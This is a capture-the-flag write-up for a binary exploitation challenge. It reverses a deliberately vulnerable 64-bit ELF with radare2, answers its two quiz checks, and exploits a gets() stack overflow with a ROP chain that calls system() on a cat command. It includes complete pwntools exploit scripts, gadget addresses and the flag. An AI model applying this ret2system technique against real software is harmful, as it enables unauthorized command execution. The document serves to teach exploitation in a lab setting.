# pwn 02

Category: PWN
Points: 491
Solves: 6
Author: @mrerror0790

Challenge Description:
Can you return my flag here?

nc pwn02.ctf.teamquark.com 65302

Artifact Files:
[pwn02.zip](./pwn02.zip)

## Quick Overview

When running the program we get prompted with the same banner as for pwn01 but this  time
with a quick quiz before getting to the vulnerable input part !

## Running the binary

```
┌───────────────────────────────────────────────────────────────────────┐
│ ██████╗ ██╗   ██╗ █████╗ ██████╗ ██╗  ██╗     ██████╗████████╗███████╗│
│██╔═══██╗██║   ██║██╔══██╗██╔══██╗██║ ██╔╝    ██╔════╝╚══██╔══╝██╔════╝│
│██║   ██║██║   ██║███████║██████╔╝█████╔╝     ██║        ██║   █████╗  │
│██║▄▄ ██║██║   ██║██╔══██║██╔══██╗██╔═██╗     ██║        ██║   ██╔══╝  │
│╚██████╔╝╚██████╔╝██║  ██║██║  ██║██║  ██╗    ╚██████╗   ██║   ██║     │
│ ╚══▀▀═╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝     ╚═════╝   ╚═╝   ╚═╝     │
└───────────────────────────────────────────────────────────────────────┘
                         Inspired by fsociety ;-)



It's time for Quiz

Who hacked Steel Mountain ?
dunno

(binary terminated)
```

## Information gathering

The file is an ELF 64 executable (LSB) and the following securities are applied
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   72 Symbols	  No	0	
```

Same protections as for the first binary. No shellcode injection or libc given so we'll see what we have to do after
some reversing !

Some other worthy information is that in the given .zip file which gives the whole Docker instance,
the flag.txt file contains "flag is in hvfstjehcy.txt file ;-)" which well quite obviously means we need
to read hvfstjehcy.txt where the flag indeed is stored.

## Reversing CODE

Reversing tool : **radare2**

Listing the functions in the binary we get this :
```
0x00401090    1     42 entry0
0x004010d0    4     31 sym.deregister_tm_clones
0x00401100    4     49 sym.register_tm_clones
0x00401140    3     28 sym.__do_global_dtors_aux
0x00401170    1      2 sym.frame_dummy
0x00401470    1      1 sym.__libc_csu_fini
0x00401474    1      9 sym._fini
0x00401172    3     42 sym.chk1
0x00401410    4     93 sym.__libc_csu_init
0x004010c0    1      1 sym._dl_relocate_static_pie
0x004011d7    1    218 sym.useful_stuffs
0x004012b1    4    345 main
0x00401030    1      6 sym.imp.puts
0x00401080    1      6 sym.imp.fflush
0x00401050    1      6 sym.imp.fgets
0x0040119c    3     42 sym.chk2
0x00401070    1      6 sym.imp.gets
0x004011c6    1     17 sym.xyz
0x00401040    1      6 sym.imp.system
0x00401000    3     23 sym._init
0x00401060    1      6 sym.imp.strcmp
```

there's a couple things to pick up from this:
- Some functions to look at are main obviously and also **sym.chk1**, **sym.chk2**, **sym.xyz**, **sym.useful_stuffs**
- We can see general functions that are used in the binary and one stands out : **gets** 

With this info it's likely that chk1 and chk2 are checking function to validate our quiz input at the start
of the binary and xyz and useful_stuffs are gonna be used to make our exploit.

Let's read the assembly code of those functions now.

**main**:
```asm
┌ 345: int main (int argc, char **argv);
│           ; arg int argc @ rdi
│           ; arg char **argv @ rsi
│           ; var char *s @ rbp-0xa
│           ; var char *var_20h @ rbp-0x20
│           ; var char *var_40h @ rbp-0x40
│           ; var int64_t var_44h @ rbp-0x44
│           ; var char **var_50h @ rbp-0x50
│           0x004012b1      55             push rbp
│           0x004012b2      4889e5         mov rbp, rsp
│           0x004012b5      4883ec50       sub rsp, 0x50 // Allocate 80 bytes on the stack
│           0x004012b9      897dbc         mov dword [var_44h], edi    ; argc // copy argc to rbp-0x44 as 32 bits integer
│           0x004012bc      488975b0       mov qword [var_50h], rsi    ; argv // copy argument pointer to rbp-0x50
│           0x004012c0      b800000000     mov eax, 0
│           0x004012c5      e80dffffff     call sym.useful_stuffs // Calling unknown function we'll have to check it out later
│           0x004012ca      bf88204000     mov edi, 0x402088           ; const char *s
│           0x004012cf      e85cfdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004012d4      bf68214000     mov edi, str._______________ ; 0x402168 ; const char *s
│           0x004012d9      e852fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004012de      bf28224000     mov edi, str.________       ; 0x402228 ; const char *s
│           0x004012e3      e848fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004012e8      bff8224000     mov edi, str.________________________ ; 0x4022f8 ; const char *s
│           0x004012ed      e83efdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004012f2      bfa8234000     mov edi, str.______________________ ; 0x4023a8 ; const char *s
│           0x004012f7      e834fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004012fc      bf58244000     mov edi, str._____________________ ; 0x402458 ; const char *s
│           0x00401301      e82afdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00401306      bf10254000     mov edi, str.__________________________ ; 0x402510 ; const char *s
│           0x0040130b      e820fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00401310      bfb8254000     mov edi, str.               ; 0x4025b8 ; const char *s
│           0x00401315      e816fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0040131a      bf98264000     mov edi, str._________________________Inspired_by_fsociety_____n_n_n ; 0x402698 ; "                         Inspired by fsociety ;-)\n\n\n" ; const char *s
│           0x0040131f      e80cfdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00401324      488b05352d00.  mov rax, qword [obj.stdout] ; obj.stdout__GLIBC_2.2.5
│                                                                      ; [0x404060:8]=0
│           0x0040132b      4889c7         mov rdi, rax                ; FILE *stream
│           0x0040132e      e84dfdffff     call sym.imp.fflush         ; int fflush(FILE *stream)
│           0x00401333      bfcd264000     mov edi, str.Its_time_for_Quiz_n ; 0x4026cd ; "It's time for Quiz\n" ; const char *s
│           0x00401338      e8f3fcffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0040133d      bfe1264000     mov edi, str.Who_hacked_Steel_Mountain__ ; 0x4026e1 ; "Who hacked Steel Mountain ?" ; const char *s
│           0x00401342      e8e9fcffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00401347      488b05122d00.  mov rax, qword [obj.stdout] ; obj.stdout__GLIBC_2.2.5
│                                                                      ; [0x404060:8]=0
│           0x0040134e      4889c7         mov rdi, rax                ; FILE *stream
│           0x00401351      e82afdffff     call sym.imp.fflush         ; int fflush(FILE *stream)
│           0x00401356      488b15132d00.  mov rdx, qword [obj.stdin]  ; obj.stdin__GLIBC_2.2.5
│                                                                      ; [0x404070:8]=0 ; FILE *stream
│           0x0040135d      488d45f6       lea rax, [s]
│           0x00401361      be0a000000     mov esi, 0xa                ; int size
│           0x00401366      4889c7         mov rdi, rax                ; char *s
│           0x00401369      e8e2fcffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           0x0040136e      488d45f6       lea rax, [s]
│           0x00401372      4889c7         mov rdi, rax                ; int64_t arg1
│           0x00401375      e8f8fdffff     call sym.chk1
│           0x0040137a      83f801         cmp eax, 1                  ; 1
│       ┌─< 0x0040137d      0f8580000000   jne 0x401403
│       │   0x00401383      bffd264000     mov edi, str.Thats_correct  ; 0x4026fd ; "That's correct" ; const char *s
│       │   0x00401388      e8a3fcffff     call sym.imp.puts           ; int puts(const char *s)
│       │   0x0040138d      bf10274000     mov edi, str.Who_is_the_cybersecurity_expert_and_friend_of_Elliot_ ; 0x402710 ; "Who is the cybersecurity expert and friend of Elliot?" ; const char *s
│       │   0x00401392      e899fcffff     call sym.imp.puts           ; int puts(const char *s)
│       │   0x00401397      488b05c22c00.  mov rax, qword [obj.stdout] ; obj.stdout__GLIBC_2.2.5
│       │                                                              ; [0x404060:8]=0
│       │   0x0040139e      4889c7         mov rdi, rax                ; FILE *stream
│       │   0x004013a1      e8dafcffff     call sym.imp.fflush         ; int fflush(FILE *stream)
│       │   0x004013a6      488b15c32c00.  mov rdx, qword [obj.stdin]  ; obj.stdin__GLIBC_2.2.5
│       │                                                              ; [0x404070:8]=0 ; FILE *stream
│       │   0x004013ad      488d45e0       lea rax, [var_20h]
│       │   0x004013b1      be14000000     mov esi, 0x14               ; 20 ; int size
│       │   0x004013b6      4889c7         mov rdi, rax                ; char *s
│       │   0x004013b9      e892fcffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│       │   0x004013be      488d45e0       lea rax, [var_20h]
│       │   0x004013c2      4889c7         mov rdi, rax                ; char *arg1
│       │   0x004013c5      e8d2fdffff     call sym.chk2
│       │   0x004013ca      83f801         cmp eax, 1                  ; 1
│      ┌──< 0x004013cd      7534           jne 0x401403
│      ││   0x004013cf      bf46274000     mov edi, str.Congratulations..._ ; 0x402746 ; "Congratulations...!" ; const char *s
│      ││   0x004013d4      e857fcffff     call sym.imp.puts           ; int puts(const char *s)
│      ││   0x004013d9      bf5a274000     mov edi, str.Do_you_want_the_flag__ ; 0x40275a ; "Do you want the flag ?" ; const char *s
│      ││   0x004013de      e84dfcffff     call sym.imp.puts           ; int puts(const char *s)
│      ││   0x004013e3      488b05762c00.  mov rax, qword [obj.stdout] ; obj.stdout__GLIBC_2.2.5
│      ││                                                              ; [0x404060:8]=0
│      ││   0x004013ea      4889c7         mov rdi, rax                ; FILE *stream
│      ││   0x004013ed      e88efcffff     call sym.imp.fflush         ; int fflush(FILE *stream)
│      ││   0x004013f2      488d45c0       lea rax, [var_40h]
│      ││   0x004013f6      4889c7         mov rdi, rax                ; char *s
│      ││   0x004013f9      b800000000     mov eax, 0
│      ││   0x004013fe      e86dfcffff     call sym.imp.gets           ; char *gets(char *s)
│      ││   ; CODE XREFS from main @ 0x40137d(x), 0x4013cd(x)
│      └└─> 0x00401403      b800000000     mov eax, 0
│           0x00401408      c9             leave
└           0x00401409      c3             ret
```

So the main function allocates 80 bytes on the stack, and copies argc and argv pointer into the stack
then it calls the **useful_stuffs** function.

After this the program prints the banner and starts asking questions for the quiz.
First, *"Who hacked steel mountain ?"* stores the user's input using fgets with length 10 into buffer at rbp-0xa
which is a buffer of length 10 so no overflows there.

It then puts the buffer into rdi and calls the **chk1** function, Let's reverse the function to see what the answer is:

**chk1**:
```asm
┌ 42: sym.chk1 (char *arg1);
│           ; arg char *arg1 @ rdi
│           ; var char *s1 @ rbp-0x8
│           0x00401172      55             push rbp
│           0x00401173      4889e5         mov rbp, rsp
│           0x00401176      4883ec10       sub rsp, 0x10
│           0x0040117a      48897df8       mov qword [s1], rdi         ; arg1
│           0x0040117e      488b45f8       mov rax, qword [s1]
│           0x00401182      be08204000     mov esi, str.elliot_n       ; 0x402008 ; "elliot\n" ; const char *s2
│           0x00401187      4889c7         mov rdi, rax                ; const char *s1
│           0x0040118a      e8d1feffff     call sym.imp.strcmp         ; int strcmp(const char *s1, const char *s2)
│           0x0040118f      85c0           test eax, eax
│       ┌─< 0x00401191      7507           jne 0x40119a
│       │   0x00401193      b801000000     mov eax, 1
│      ┌──< 0x00401198      eb00           jmp 0x40119a
│      ││   ; CODE XREFS from sym.chk1 @ 0x401191(x), 0x401198(x)
│      └└─> 0x0040119a      c9             leave
└           0x0040119b      c3             ret
```
So our pointer to the buffer gets copies into the char pointer at rbp-0x8.
it then loads the .data address 0x402008 which points to the string "elliot\n" into esi
and compares the buffer with "elliot\n". Which means we got our answer for the first question !

Going back to main now, if we fail the **chk1** function the program jumps into the end of the main function
and terminates correctly.

Otherwise it prints "That's correct !" and continues further with another question :
*"Who is the cybersecurity expert and friend of Elliot?"*

Then same logic is applied as for the first question, let's look into **chk2**.

**chk2**:
```asm
┌ 42: sym.chk2 (char *arg1);
│           ; arg char *arg1 @ rdi
│           ; var char *s1 @ rbp-0x8
│           0x0040119c      55             push rbp
│           0x0040119d      4889e5         mov rbp, rsp
│           0x004011a0      4883ec10       sub rsp, 0x10
│           0x004011a4      48897df8       mov qword [s1], rdi         ; arg1
│           0x004011a8      488b45f8       mov rax, qword [s1]
│           0x004011ac      be10204000     mov esi, str.Darlene_Alderson_n ; 0x402010 ; "Darlene Alderson\n" ; const char *s2
│           0x004011b1      4889c7         mov rdi, rax                ; const char *s1
│           0x004011b4      e8a7feffff     call sym.imp.strcmp         ; int strcmp(const char *s1, const char *s2)
│           0x004011b9      85c0           test eax, eax
│       ┌─< 0x004011bb      7507           jne 0x4011c4
│       │   0x004011bd      b801000000     mov eax, 1
│      ┌──< 0x004011c2      eb00           jmp 0x4011c4
│      ││   ; CODE XREFS from sym.chk2 @ 0x4011bb(x), 0x4011c2(x)
│      └└─> 0x004011c4      c9             leave
└           0x004011c5      c3             ret
```

So the user's input is compared in the same way with the .data string "Darlene Alderson\n" which gives us our
second question's answer !

Note that this question calls fgets with 22 bytes of data into a buffer of size 22 at rbp-0x20

After passing both of those tests, the program prints some congratulations and asks us if we want the flag...
Aaaand takes input into a new buffer at rbp-0x40. Since the last buffer is stored in memory at rbp-0x20, we can
calculate that the buffer size is 32.

Now the big red flag is that it uses **gets()** on that buffer which doesn't care about length and is widely
known as a terrible function to use in C.

Since the buffer is at rbp-0x40 we can overflow 64 bytes (0x40 = 64) to reach the stack base and add 8 bytes to 
overwrite the rbp value that was pushed on the stack at the start of the function call. After that the address that is left is the one the function will return to at the end of it's execution.

Which means an whatever we write after 64 + 8 bytes will be where the program returns it's execution.

Alright, we got our way to manipulate the program's execution. Now let's look into the **useful_stuffs()** functions and
**xyz()** functions.

**xyz**:
```asm
┌ 17: sym.xyz ();
│           0x004011c6      55             push rbp
│           0x004011c7      4889e5         mov rbp, rsp
│           0x004011ca      bf22204000     mov edi, str._bin_date      ; 0x402022 ; "/bin/date" ; const char *string
│           0x004011cf      e86cfeffff     call sym.imp.system         ; int system(const char *string)
│           0x004011d4      90             nop
│           0x004011d5      5d             pop rbp
└           0x004011d6      c3             ret
```

this function just calls system("/bin/date") and returns...
Interesting but obviously not of interest if we just return to it, it'll just print the date and not the flag...

Now let's look at **useful_stuffs**.

**useful_stuffs**:
```asm
┌ 218: sym.useful_stuffs ();
│           ; var char *var_140h @ rbp-0x140
│           ; var char *var_280h @ rbp-0x280
│           ; var char *var_3c0h @ rbp-0x3c0
│           ; var char *var_500h @ rbp-0x500
│           ; var char *var_640h @ rbp-0x640
│           ; var char *var_780h @ rbp-0x780
│           0x004011d7      55             push rbp
│           0x004011d8      4889e5         mov rbp, rsp
│           0x004011db      4881ec080700.  sub rsp, 0x708
│           0x004011e2      488d95c0feff.  lea rdx, [var_140h]
│           0x004011e9      b800000000     mov eax, 0
│           0x004011ee      b928000000     mov ecx, 0x28               ; '(' ; 40
│           0x004011f3      4889d7         mov rdi, rdx
│           0x004011f6      f348ab         rep stosq qword [rdi], rax
│           0x004011f9      48c785c0feff.  mov qword [var_140h], str._bin_ls ; 0x40202c ; "/bin/ls"
│           0x00401204      488d9580fdff.  lea rdx, [var_280h]
│           0x0040120b      b800000000     mov eax, 0
│           0x00401210      b928000000     mov ecx, 0x28               ; '(' ; 40
│           0x00401215      4889d7         mov rdi, rdx
│           0x00401218      f348ab         rep stosq qword [rdi], rax
│           0x0040121b      48c78580fdff.  mov qword [var_280h], str._bin_id ; 0x402034 ; "/bin/id"
│           0x00401226      488d9540fcff.  lea rdx, [var_3c0h]
│           0x0040122d      b800000000     mov eax, 0
│           0x00401232      b928000000     mov ecx, 0x28               ; '(' ; 40
│           0x00401237      4889d7         mov rdi, rdx
│           0x0040123a      f348ab         rep stosq qword [rdi], rax
│           0x0040123d      48c78540fcff.  mov qword [var_3c0h], str._bin_cat_flag.txt ; 0x40203c ; "/bin/cat flag.txt"
│           0x00401248      488d9500fbff.  lea rdx, [var_500h]
│           0x0040124f      b800000000     mov eax, 0
│           0x00401254      b928000000     mov ecx, 0x28               ; '(' ; 40
│           0x00401259      4889d7         mov rdi, rdx
│           0x0040125c      f348ab         rep stosq qword [rdi], rax
│           0x0040125f      48c78500fbff.  mov qword [var_500h], str._bin_ls__lah ; 0x40204e ; "/bin/ls -lah"
│           0x0040126a      488d95c0f9ff.  lea rdx, [var_640h]
│           0x00401271      b800000000     mov eax, 0
│           0x00401276      b928000000     mov ecx, 0x28               ; '(' ; 40
│           0x0040127b      4889d7         mov rdi, rdx
│           0x0040127e      f348ab         rep stosq qword [rdi], rax
│           0x00401281      48c785c0f9ff.  mov qword [var_640h], str._bin_uname__a ; 0x40205b ; "/bin/uname -a"
│           0x0040128c      488d9580f8ff.  lea rdx, [var_780h]
│           0x00401293      b800000000     mov eax, 0
│           0x00401298      b928000000     mov ecx, 0x28               ; '(' ; 40
│           0x0040129d      4889d7         mov rdi, rdx
│           0x004012a0      f348ab         rep stosq qword [rdi], rax
│           0x004012a3      48c78580f8ff.  mov qword [var_780h], str._bin_cat_hvfstjehcy.txt ; 0x402069 ; "/bin/cat hvfstjehcy.txt"
│           0x004012ae      90             nop
│           0x004012af      c9             leave
└           0x004012b0      c3             ret
```

This one does quite a lot of random stuff, basically just loading random .data addresses. 
This however does show a VERY interesting thing which is that a string containing the data "/bin/cat hvfstjehcy.txt" is
stored inside of the binary at address 0x402069. This is great news because we also have a system() call stored
inside of the program's .text section

Which means we can use ROP (Return Oriented Programming) in order to use a "pop rdi; ret" gadget to put 0x402069 inside
of rdi and jump to the system call to run `system("/bin/cat hvfstjehcy.txt");` and print the flag.

Note: We do have to jump EXACTLY at the system call address not the xyz function, otherwise rdi will be overwritten

Using **ROPgadget** I found `0x000000000040146b : pop rdi ; ret`

Alright now that we have an exploit plan, let's get to work !

### Exploiting the binary

As a little reminder, we do have to answer the quiz before reaching the vulnerable code ! 
So let's automate that using pwntools.

```py
#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF('./src/pwn02')
context.arch = 'amd64'
context.endian = 'little'
context.log_level = 'error'

if args.REMOTE:
    io = remote("pwn02.ctf.teamquark.com", 65302)
else:
    io = elf.process()

io.recvline("?\n")
io.sendline(b'elliot') # Send first answer

io.recvline("?\n")
io.sendline(b'Darlene Alderson') # Send second answer

io.interactive()
io.close()
```

Running this exploit prints "Do you want the flag?" and asks for the vulnerable input!
Alright now we can get to the interesting part, building our payload and exploiting the buffer overflow.

```py
#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF('./src/pwn02')
context.arch = 'amd64'
context.endian = 'little'
context.log_level = 'error'

if args.REMOTE:
    io = remote("pwn02.ctf.teamquark.com", 65302)
else:
    io = elf.process()

io.recvuntil(b"?\n")
io.sendline(b'elliot') # Send first answer

io.recvuntil(b"?\n")
io.sendline(b'Darlene Alderson') # Send second answer

io.recvuntil(b"?\n") # Jump to the vulnerable input

offset = 72
cat_cmd = 0x402069
pop_rdi = 0x40146b
system_call = 0x4011cf

payload = b''.join([
    b'A'*offset,
    pack(pop_rdi),
    pack(cat_cmd),
    pack(system_call)
])

io.sendline(payload) # Run the payload
io.interactive()
io.close()
```

Running this script on the remote prints us the flag !
Now let's clean it up a bit.

```py
#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF('./src/pwn02')
context.arch = 'amd64'
context.endian = 'little'
context.log_level = 'error'

if args.REMOTE:
    io = remote("pwn02.ctf.teamquark.com", 65302)
else:
    io = elf.process()

io.recvuntil(b"?\n")
io.sendline(b'elliot') # Send first answer

io.recvuntil(b"?\n")
io.sendline(b'Darlene Alderson') # Send second answer

io.recvuntil(b"?\n") # Jump to the vulnerable input

offset = 72
cat_cmd = 0x402069
pop_rdi = 0x40146b
system_call = 0x4011cf

payload = b''.join([
    b'A'*offset,
    pack(pop_rdi),
    pack(cat_cmd),
    pack(system_call)
])

io.sendline(payload) # Run the payload
flag = io.recvline().decode().strip()
print("[+] Flag :", flag)
io.close()
```

Flag : `quarkCTF{r0p_cH4n1n_4r3_4m4zinG}` 
And here we go that is a successful exploit ! Hopefully you learned something in this writeup :D

[Back to home](../../README.md)
